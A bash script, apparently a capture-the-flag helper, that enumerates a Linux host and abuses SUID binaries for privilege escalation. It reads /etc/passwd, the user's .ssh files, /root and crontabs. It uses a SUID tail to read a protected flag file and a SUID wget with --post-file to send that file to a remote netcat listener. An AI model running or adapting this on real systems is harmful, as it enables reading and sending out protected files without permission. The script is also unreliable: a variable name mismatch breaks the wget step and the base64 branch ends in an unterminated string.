#!/bin/bash

uname -a
whoami
echo  "Trying sudo -l. Please enter that password if you know it"
sudo -l
echo
echo  "Searching for ssh files in the user's directory..."
find $HOME -name ".ssh" -ls
ls -la $HOME/.ssh

echo
echo "Trying to ls what is inside root's directory..."
ls -la /root
echo
echo  "Looking at cronjobs..."
crontab -l
echo  "Checking /etc/crontab file..."
cat /etc/crontab

echo
echo  "Checking /etc/passwd file..."
cat /etc/passwd

echo
echo  "Searching for SUID Binaries that might lead to some privesc..."
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null > .file
echo  "Here are some routes you can take for privesc through SUID binaries..."
echo -n "If there is a certain flag such as /root/flag.txt then enter it here: "
read FLAG
sleep 3
	if grep -q /usr/bin/tail ".file";
	then
	echo "Found /usr/bin/tail"
	echo -n "Would you like me to try and elevate your privileges with /usr/bin/tail?: "
	read TAIL
		if [[ $TAIL =~ ^[Yy]$ ]]
		then
		echo "Trying privesc with /usr/bin/tail..."
		/usr/bin/tail $FLAG
		else
		echo ""
		fi
	else
	echo "-------------------"
	fi
	if grep -q /usr/bin/wget ".file";
	then
	echo "Found /usr/bin/wget";
	echo -n "Would you like me to try and elevate your privileges with /usr/bin/wget?: "
	read WGET
		if [[ $WGET =~ ^[Yy]$ ]]
		then
		echo "Trying privesc with /usr/bin/wget..."
		echo "In order to use this one you will need to start a netcat listener on port 4445. (Y/N): "
		read NC
		echo "Enter your remote address here: "
		read Address
		/usr/bin/wget --post-file=$FLAG http://$ADDRESS:4445
		echo "Check your nc listener!"
		fi
	else
	echo "-------------------"
	fi
	if grep -q /usr/bin/base64 ".file";
	then
	echo "Found /usr/bin/base64"
	echo -n "Would you like me to try and elevate your privileges with /usr/bin/base64
	else
	echo "-------------------"
	fi
rm .file
